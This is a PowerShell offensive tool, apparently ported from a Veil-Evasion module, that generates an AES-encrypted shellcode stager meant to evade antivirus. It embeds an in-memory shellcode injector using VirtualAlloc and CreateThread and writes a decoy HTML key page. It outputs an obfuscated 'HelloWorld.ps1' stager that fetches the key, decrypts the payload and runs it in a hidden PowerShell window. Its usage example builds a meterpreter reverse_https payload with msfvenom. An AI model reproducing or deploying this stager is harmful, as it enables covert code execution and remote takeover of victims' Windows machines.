<#
	.SYNOPSIS
	The powershell implementation of Killswitch-Gui's AES_encrypt_HTTPKEY_Request.py module in the Veil-Evasion framework. This payload has AES encrypted shellcode stored on a webserver. At runtime, the executable uses the key from an HTML request holding the key, and md5 hashes the html output in order to produce the required 16 Byte key. The shellcode is then decrypted and injected into memory and executed.
	
	.DESCRIPTION
	This tool can be used to generate an AES encrypted stager that decrypts itself and executes the provided shellcode or payload on the target machine.
	
	.PARAMETER Sleep
	
	.PARAMETER InjectMethod
	
	.PARAMETER TargetServer
	
	.PARAMETER FilePath
	
	.PARAMETER UserAgent
	
	.PARAMETER Payload
	
	.PARAMETER CustomHTML
	
	.LINK
	ConvertShellCode.py script created by @Rvrsh3ll
	https://gist.github.com/rvrsh3ll/abea05538480db9e41afa3799e5053bb
	
	Based on the aes_encrypt_HTTPKEY_Request.py module in the Veil-Evasion framework found here created by @Killswitch-Gui
	https://github.com/Veil-Framework/Veil-Evasion/blob/master/modules/payloads/python/shellcode_inject/aes_encrypt_HTTPKEY_Request.py
	
	.EXAMPLE
	To generate shellcode in Kali:
	> msfvenom -p windows/meterpreter/reverse_https -f raw >> rawshellcode.txt
	> python ConvertShellCode.py  rawshellcode.txt
	
	On your windows machine:
	> ./AESEncrypt.ps1 -Shellcode "x00,x00,x00,x00,xbl,xah,xbl,xah" -TargetServer 192.168.1.13
	> Get-EncryptedShellCode -UserAgent 'NotFirefox' -FilePath 'C:\inetpub\wwwroot\shellcode\' -TargetServer 127.0.0.1 -payload 'payload.txt'
	
	On the target machine:
	> Import-Module HelloWorld.ps1
	> Invoke-PlayingInTheSand

#>

	[CmdletBinding()]
	param(
		[Int]$Sleep = 10,
	
		[String]$InjectMethod = "Not Implemented Yet",
		
		[String]$TargetServer = "192.168.1.12", #Done
		
		[String]$FilePath = (Get-Location), #Done
		
		[String]$FileName = "decrypt.html", #Done 

		[String]$UserAgent = "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36", #Done 
		
		[String]$Payload, #Done
		
		[String]$Shellcode, #Done
		
		$CustomHTML #Done
		)	
	
	
	
	
Function Invoke-GeneratePayload {
	#Note to Self: https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/payloads/powershell/powershell_shellcode.code Maybe use this one day if it makes more sense to use.
	#Powershell Oneliner created by Dave Kennedy Twitter:@Rel1k
	#Copyright 2017, The Social-Engineer Toolkit (SET) by TrustedSec, LLC
	#All rights reserved.
	

	#Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:

	#    * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
	#    * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
	#    * Neither the name of Social-Engineer Toolkit nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.

	#THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
	#The above licensing was taken from the BSD licensing and is applied to Social-Engineer Toolkit as well.\
	#Note that the Social-Engineer Toolkit is provided as is, and is a royalty free open-source application.
	#Feel free to modify, use, change, market, do whatever you want with it as long as you give the appropriate credit where credit is due (which means giving the authors the credit they deserve for writing it). 
	#Also note that by using this software, if you ever see the creator of SET in a bar, you should (optional) give him a hug and should (optional) buy him a beer (or bourbon - hopefully bourbon). Author has the option to refuse the hug (most likely will never happen) or the beer or bourbon (also most likely will never happen). Also by using this tool (these are all optional of course!), you should try to make this industry better, try to stay positive, try to help others, try to learn from one another, try stay out of drama, try offer free hugs when possible (and make sure recipient agrees to mutual hug), and try to do everything you can to be awesome. 
	
	#Maybe just encrypt Payload only?
	if ($shellcode) {
	$script:buildPayload = "`$shellcode = '`$code = ''[DllImport(`"kernel32.dll`")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(`"kernel32.dll`")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(`"msvcrt.dll`")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';`$winFunc = Add-Type -memberDefinition `$code -Name `"Win32`" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]`$sc64 = $Shellcode;[Byte[]]`$sc = `$sc64;`$size = 0x1000;if (`$sc.Length -gt 0x1000) {`$size = `$sc.Length};`$x=`$winFunc::VirtualAlloc(0,0x1000,`$size,0x40);for (`$i=0;`$i -le (`$sc.Length-1);`$i++) {`$winFunc::memset([IntPtr](`$x.ToInt32()+`$i), `$sc[`$i], 1)};`$winFunc::CreateThread(0,0,`$x,0,0,0);for (;;) { Start-sleep 60 };';`$goat = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(`$shellcode));if(`$env:PROCESSOR_ARCHITECTURE -eq `"AMD64`"){`$powershellx86 = `$env:SystemRoot + `"syswow64WindowsPowerShellv1.0powershell.exe`";`$cmd = `"-noprofile -windowstyle hidden -noninteractive -EncodedCommand`";iex `"& `$powershellx86 `$cmd `$goat`"}else{`$cmd = `"-noprofile -windowstyle hidden -noninteractive -EncodedCommand`";iex `"& powershell `$cmd `$goat`";}"	
	}
	elseif ($Payload) {
	$script:buildPayload = $Payload
	}
	
	
}
	
	
Function Invoke-GenerateHTML {
  Write-Host "Generating HTML Template..."
  $RandomKeyString = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
  
  if($CustomHTML){
	$script:HTMLTemplate = Get-Content $CustomHTML
	$script:HTMLTemplate += "<!--$RandomKeyString-->"
  }
  else{
	$script:HTMLTemplate="<p>Hello World</p> <!--$RandomKeyString-->"
  }
	if($script:HTMLTemplate){
		Write-Host "HTML Template generated successfully"
		$script:HTMLTemplate | Out-File "$FilePath/$FileName"
		}
	else {
		Write-Host "Could not generate Template"
		}
		
}	

Function Invoke-EncryptPayload {
	####Generate AES Object
	$bytes = [System.Text.Encoding]::UTF8.GetBytes($script:buildPayload)
	$aesManaged = New-Object "System.Security.Cryptography.AesManaged"
	$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
	$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
	$aesManaged.BlockSize = 128
	$aesManaged.KeySize = 256
	###Generate AES Object

	###Download templatepage.html and hash it, use that to make a key 
	$downloadURL = "http://$TargetServer/$FileName"
	$md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
	$utf8 = new-object -TypeName System.Text.UTF8Encoding
	$hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes("$script:HTMLTemplate`n"))) #Had to add a newline because the WebServer/Browser does for some reason
	$key = $hash.Replace("-",'')
	$aesManaged.Key = $utf8.GetBytes($key)
	###Key Generation


	###Create an Encryptor and encrypt the data
	Write-Host "Encrypting the payload..."
	$encryptor = $aesManaged.CreateEncryptor()
	$encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
	
	If ($encryptedData){
		Write-Host "Data successfully encrypted"
		}
	else {
		Write-Host "Couldn't encrypt data"
		exit
	}
	###Data is encrypted

	$StageIV = $aesManaged.IV #Putting this here temporarily, maybe I'll find a better place for it later
	$aesManaged.Dispose()

	#Base64 encoding IV so that we don't lose anything
	$EncryptedB64 = [System.Convert]::ToBase64String($EncryptedData)
	$Base64IV = [System.Convert]::ToBase64String($StageIV)

	#Time to generate our stager
	
	Try {
	Invoke-GenerateStager $Base64IV $EncryptedB64
	}
	Catch
	{
	Write-Host "Couldn't output stager"
	}
	#Stager is output to your location.
}

Function Invoke-GenerateStager ($IV, $B64Payload) {
	#Generate Key to encrypt
	#Encrypt Payload
	#Generate PS Stager that contains encrypted code and downloads/hashes key
	#Stager check date, still valid? If not, exit.
	#Stager check for 200
	#if not, sleep try again until valid.
	
	#Generate Random Variable Names
	$varAESManaged = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	$varUnencryptedData = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	$varEncryptedB64 = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	$varEncryptedB64IV = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	$varRequest = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	$varWebClient = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	$varMD5 = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	$varUTF8 = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	$varIV = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	$varKey = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	$varBytes = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	$varHash = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	$varDecryptor = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
	
	#Generates a ps script that can be used to decrypt and run the shellcode/payload
	$Stager =  "Function Invoke-PlayingInTheSand {`n"
	$Stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}`n"
	$Stager += "`$$varWebClient = (New-Object System.Net.WebClient)`n" 
	$Stager += "`$$varWebClient.Headers.Add('user-agent', '$UserAgent')`n"
	#$Stager += "`$$varRequest = `$$varWebClient.DownloadString('$downloadURL')`n"
	#For Local testing=====================================
	$Stager += "`$$varRequest = Get-Content 'decrypt.html'`n"
	$Stager += "`$$varRequest += ""``n""`n"
	#For Local Testing=====================================
	$Stager += "`$$varEncryptedB64 = '$EncryptedB64'`n"
	$Stager += "`$$varEncryptedB64IV = `'$Base64IV`'`n"
	$Stager += "`$$varMD5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider`n"
	$Stager += "`$$varUTF8 = new-object -TypeName System.Text.UTF8Encoding`n"
	$Stager += "`$$varHash = [System.BitConverter]::ToString(`$$varMD5.ComputeHash(`$$varUTF8.GetBytes(`$$varRequest)))`n"
	$Stager += "`$$varIV = [System.Convert]::FromBase64String(`$$varEncryptedB64IV)`n"
	$Stager += "`$$varKey = `$$varHash.Replace('-','')`n"	
	$Stager += "`$$varaesManaged = New-Object 'System.Security.Cryptography.AesManaged'`n"
	$Stager += "`$$varaesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC`n"
	$Stager += "`$$varaesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros`n"
	$Stager += "`$$varaesManaged.BlockSize = 128`n"
	$Stager += "`$$varaesManaged.KeySize = 256`n"
	$Stager += "`$$varaesManaged.IV = `$$varIV`n"
	$Stager += "`$$varaesManaged.Key = `$$varUTF8.GetBytes(`$$varKey)`n"
	$Stager += "`$$varBytes = [System.Convert]::FromBase64String(`$$varEncryptedB64)`n"
	$Stager += "`$$varDecryptor = `$$varaesManaged.CreateDecryptor()`n"
	$Stager += "`$$varunencryptedData = `$$vardecryptor.TransformFinalBlock(`$$varBytes, 0, `$$varBytes.Length)`n"	
	$Stager += "`$$varunencryptedData = [System.Text.Encoding]::UTF8.GetString(`$$varunencryptedData).Trim([char]0)`n"
	$Stager += "`$$varunencrypteddata | powershell.exe -w hidden`n"
	$Stager += "`$$varAESManaged.Dispose()`n"
	$Stager += "}"

	#Todo: Convert to Base64 before outputting to ps1 file for sneakiness.
	$Stager | Out-File HelloWorld.ps1
	
}

Invoke-GeneratePayload
Invoke-GenerateHTML
Invoke-EncryptPayload
